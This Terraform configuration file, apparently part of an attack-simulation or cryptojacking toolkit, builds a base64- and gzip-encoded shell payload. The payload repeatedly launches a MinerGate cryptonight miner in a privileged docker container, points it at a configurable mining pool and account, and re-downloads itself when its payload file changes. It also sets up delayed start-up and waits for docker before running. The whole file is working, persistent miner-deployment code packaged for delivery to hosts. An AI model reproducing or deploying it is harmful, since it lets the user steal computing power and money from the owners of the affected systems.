locals {
    # nicehash_name = var.inputs["nicehash_name"]
    # nicehash_image = var.inputs["nicehash_image"]
    # nicehash_server = var.inputs["nicehash_server"]
    # nicehash_user = var.inputs["nicehash_user"]
    minergate_name = var.inputs["minergate_name"]
    minergate_image = var.inputs["minergate_image"]
    minergate_server = var.inputs["minergate_server"]
    minergate_user=var.inputs["minergate_user"]

    payload = <<-EOT
    START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
    while true; do
        log "starting script"
        if [[ `sudo docker ps | grep ${local.minergate_name}` ]]; then docker stop ${local.minergate_name}; fi
        sudo docker run --rm -d --network=host --name ${local.minergate_name} ${local.minergate_image} -a cryptonight -o ${local.minergate_server} -u ${ local.minergate_user } -p x
        sudo docker ps -a >> $LOGFILE 2>&1
        log 'waiting 30 minutes...';
        sleep 1800
        CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
        if [ "$CHECK_HASH" != "$START_HASH" ]; then
            log "payload update detected - exiting loop and forcing payload download"
            rm -f /tmp/payload_$SCRIPTNAME
            break
        else
            log "restarting loop..."
        fi
    done
    log "Done."
    EOT
    
    base64_payload = templatefile("${path.module}/../../delayed_start.sh", { config = {
        script_name = var.inputs["tag"]
        log_rotation_count = 2
        apt_pre_tasks = <<-EOT
        log "Checking for docker..."
        while ! command -v docker > /dev/null || ! docker ps > /dev/null; do
            log "docker not found or not ready - waiting"
            sleep 120
        done
        log "docker path: $(command -v  docker)"
        EOT
        apt_packages = ""
        apt_post_tasks = ""
        yum_pre_tasks =  <<-EOT
        log "Checking for docker..."
        while ! command -v docker > /dev/null || ! docker ps > /dev/null; do
            log "docker not found or not ready - waiting"
            sleep 120
        done
        log "docker path: $(command -v  docker)"
        EOT
        yum_packages = ""
        yum_post_tasks = ""
        script_delay_secs = 30
        next_stage_payload = local.payload
    }})

    outputs = {
        base64_payload = base64gzip(local.base64_payload)
        base64_uncompressed_payload = base64encode(local.base64_payload)
        base64_uncompressed_payload_additional = []
    }
}